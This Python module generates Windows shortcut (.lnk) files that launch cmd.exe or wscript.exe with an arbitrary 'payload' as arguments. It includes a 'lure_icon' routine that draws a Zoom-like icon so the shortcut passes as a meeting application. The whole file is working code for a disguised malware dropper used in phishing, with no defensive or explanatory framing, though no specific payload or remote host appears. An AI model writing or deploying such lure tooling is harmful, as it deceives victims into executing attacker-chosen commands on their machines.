"""Windows Shell Link (.lnk) generator (MS-SHLLINK).

Targets an absolute system executable (cmd.exe / wscript.exe) via LinkInfo and
passes the payload as command-line arguments, so the shortcut works from any
folder the user saves it to. Validated with WScript.Shell + ShellExecute.
"""

from __future__ import annotations

import struct

CLSID_SHELL_LINK = bytes(
    [0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
     0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46]
)

HAS_LINK_INFO = 0x00000002
HAS_ARGUMENTS = 0x00000020
HAS_ICON_LOCATION = 0x00000040
IS_UNICODE = 0x00000080


def _utf16z(value: str) -> bytes:
    data = value.encode("utf-16-le")
    return struct.pack("<H", (len(data) // 2) + 1) + data + b"\x00\x00"


def _link_info(target_path: str) -> bytes:
    base = target_path.encode("ascii", "replace") + b"\x00"
    suffix = b"\x00"
    # VolumeID: size, drive type (3 = fixed), serial, label offset (0x10), label
    volume = struct.pack("<IIII", 17, 3, 0, 0x10) + b"\x00"
    header_size = 28  # ANSI-only LinkInfo header
    volume_offset = header_size
    base_offset = volume_offset + len(volume)
    suffix_offset = base_offset + len(base)
    total = suffix_offset + len(suffix)
    return (
        struct.pack(
            "<IIIIIII",
            total, header_size, 0x1, volume_offset, base_offset, 0, suffix_offset
        )
        + volume
        + base
        + suffix
    )


def build_lnk(
    target_path: str,
    arguments: str = "",
    icon_path: str = "",
    description: str = "",
) -> bytes:
    flags = HAS_LINK_INFO | IS_UNICODE
    if arguments:
        flags |= HAS_ARGUMENTS
    if icon_path:
        flags |= HAS_ICON_LOCATION

    header = struct.pack(
        "<I16sIIQQQ i i I H H I I",
        0x4C, CLSID_SHELL_LINK, flags, 0x20, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0
    )
    data = bytearray(header)
    data += _link_info(target_path)
    if arguments:
        data += _utf16z(arguments)
    if icon_path:
        data += _utf16z(icon_path)
    data += struct.pack("<I", 0)
    return bytes(data)


def lure_icon() -> bytes:
    """32x32 32bpp ICO, Zoom-like blue tile with a white glyph."""
    w = h = 32
    pixels = bytearray()
    for y in range(h):
        for x in range(w):
            if 2 <= x < w - 2 and 2 <= y < h - 2:
                if 10 <= x < 22 and 12 <= y < 20:
                    r, g, b = 255, 255, 255
                else:
                    r, g, b = 0x2D, 0x8C, 0xFF
            else:
                r, g, b = 0, 0, 0
            pixels += bytes((b, g, r, 0))
    bmp = struct.pack("<IiiHHIIiiII", 40, w, h * 2, 1, 32, 0, len(pixels), 0, 0, 0, 0)
    and_mask = b"\x00" * ((w // 8) * h)
    image = bmp + bytes(pixels) + and_mask
    ico = struct.pack("<HHH", 0, 1, 1)
    ico += struct.pack("<BBBBHHII", w, h, 0, 0, 1, 32, len(image), 22)
    return ico + image
